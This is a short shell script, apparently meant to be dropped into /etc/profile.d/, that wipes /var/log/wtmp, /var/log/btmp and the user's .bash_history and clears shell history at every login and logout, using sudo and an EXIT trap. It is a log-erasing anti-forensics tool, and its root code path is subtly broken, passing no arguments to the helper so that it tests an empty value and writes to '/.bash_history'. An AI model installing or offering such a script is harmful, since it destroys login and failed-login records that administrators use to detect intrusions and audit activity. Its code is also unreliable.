# saved to /etc/profile.d/

id=$(id -u)
home=$HOME

not_log() {
    echo > /var/log/wtmp
    echo > /var/log/btmp
    echo > $2/.bash_history
    if [ $1 -eq 0 ];then
	history -c
    else
    	sudo -u \#$1 bash -c 'history -c'
    fi
}

do_not_log() {
    if [ $id -eq 0 ];then
        not_log
    else
        sudo bash -c "$(declare -f not_log);not_log $id $home"
    fi
    echo 'history cleared'
}

echo ''
echo 'clear logs when log_in & log_out'
echo 'see /etc/profile.d/nolog.sh'
do_not_log
echo ''
trap "do_not_log" EXIT

